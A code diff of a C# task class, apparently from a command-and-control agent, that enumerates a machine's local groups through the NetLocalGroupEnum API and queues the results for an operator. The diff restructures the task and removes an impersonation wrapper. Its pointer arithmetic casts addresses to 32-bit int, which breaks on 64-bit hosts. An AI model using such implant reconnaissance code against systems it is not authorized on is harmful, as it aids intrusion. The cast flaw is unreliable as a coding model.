@@ -79,72 +79,68 @@ namespace Tasks
             _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp = new TaskResponse { };
+            int res = 0;
+            int level = 1;
+            IntPtr buffer = IntPtr.Zero;
+            int MAX_PREFERRED_LENGTH = -1;
+            int read = 0, total = 0;
+            IntPtr handle = IntPtr.Zero;
+            List<NetLocalGroup> results = new List<NetLocalGroup>();
+            string serverName = _data.Parameters.Trim();
+            if (string.IsNullOrEmpty(serverName))
             {
-                TaskResponse resp = new TaskResponse { };
-                int res = 0;
-                int level = 1;
-                IntPtr buffer = IntPtr.Zero;
-                int MAX_PREFERRED_LENGTH = -1;
-                int read = 0, total = 0;
-                IntPtr handle = IntPtr.Zero;
-                List<NetLocalGroup> results = new List<NetLocalGroup>();
-                string serverName = _data.Parameters.Trim();
-                if (string.IsNullOrEmpty(serverName))
-                {
-                    serverName = Environment.GetEnvironmentVariable("COMPUTERNAME");
-                }    
-                List<LocalGroupUsersInfo> groups = new List<LocalGroupUsersInfo>();
-                try
-                {
-                    using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
-                    {
-                        res = _pNetLocalGroupEnum(serverName, level, out buffer, MAX_PREFERRED_LENGTH,
-                            out read, out total, ref handle);
+                serverName = Environment.GetEnvironmentVariable("COMPUTERNAME");
+            }
 
-                        if (res != 0)
-                        {
-                            resp = CreateTaskResponse(
-                                $"Error enumuerating local groups: {res}", true, "error");
-                        } else
-                        {
-                            IntPtr ptr = buffer;
-                            for (int i = 0; i < read; i++)
-                            {
-                                LocalGroupUsersInfo group = (LocalGroupUsersInfo)Marshal.PtrToStructure(ptr, typeof(LocalGroupUsersInfo));
-                                NetLocalGroup result = new NetLocalGroup();
-                                result.ComputerName = serverName;
-                                result.GroupName = Marshal.PtrToStringUni(group.name);
-                                result.Comment = Marshal.PtrToStringUni(group.comment);
-                                results.Add(result);
-                                ptr = (IntPtr)((int)ptr + Marshal.SizeOf(typeof(LocalGroupUsersInfo)));
-                            }
-                        }   
-                    }
-                }
-                finally
-                {
-                    if (buffer != IntPtr.Zero)
-                    {
-                        _pNetApiBufferFree(buffer);
-                    }
-                }
-                if (resp.UserOutput == null)
+            List<LocalGroupUsersInfo> groups = new List<LocalGroupUsersInfo>();
+            try
+            {
+                
+                res = _pNetLocalGroupEnum(serverName, level, out buffer, MAX_PREFERRED_LENGTH,
+                    out read, out total, ref handle);
+
+                if (res != 0)
                 {
                     resp = CreateTaskResponse(
-                        _jsonSerializer.Serialize(results.ToArray()), true);
+                        $"Error enumuerating local groups: {res}", true, "error");
                 }
-                // Your code here..
-                // Then add response to queue
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                else
+                {
+                    IntPtr ptr = buffer;
+                    for (int i = 0; i < read; i++)
+                    {
+                        LocalGroupUsersInfo group =
+                            (LocalGroupUsersInfo) Marshal.PtrToStructure(ptr, typeof(LocalGroupUsersInfo));
+                        NetLocalGroup result = new NetLocalGroup();
+                        result.ComputerName = serverName;
+                        result.GroupName = Marshal.PtrToStringUni(@group.name);
+                        result.Comment = Marshal.PtrToStringUni(@group.comment);
+                        results.Add(result);
+                        ptr = (IntPtr) ((int) ptr + Marshal.SizeOf(typeof(LocalGroupUsersInfo)));
+                    }
+                }
+            }
+            finally
+            {
+                if (buffer != IntPtr.Zero)
+                {
+                    _pNetApiBufferFree(buffer);
+                }
+            }
+
+            if (resp.UserOutput == null)
+            {
+                resp = CreateTaskResponse(
+                    _jsonSerializer.Serialize(results.ToArray()), true);
+            }
+
+            // Your code here..
+            // Then add response to queue
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
